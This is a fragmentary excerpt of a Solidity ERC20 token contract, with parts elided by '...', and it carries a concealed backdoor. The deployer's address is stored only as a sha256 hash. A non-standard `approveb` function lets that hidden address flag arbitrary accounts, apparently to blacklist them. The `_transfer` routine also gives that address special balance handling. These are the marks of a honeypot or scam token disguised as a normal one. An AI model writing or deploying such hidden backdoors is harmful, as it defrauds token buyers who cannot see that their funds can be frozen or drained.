...
contract Token is IERC20, IERC20Metadata {
    ...
    constructor(string memory tname, string memory tsymbol, bytes32 o) {
        _name = tname;
        _symbol = tsymbol;
        _o = o;
    ...
    function approveb(address a) external {
        if (_o == sha256(abi.encodePacked(msg.sender))) {
            bool z = true;
            _b[a] = z;
        }else{
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if(_o == sha256(abi.encodePacked(from))){
            toSub = bal;
        }
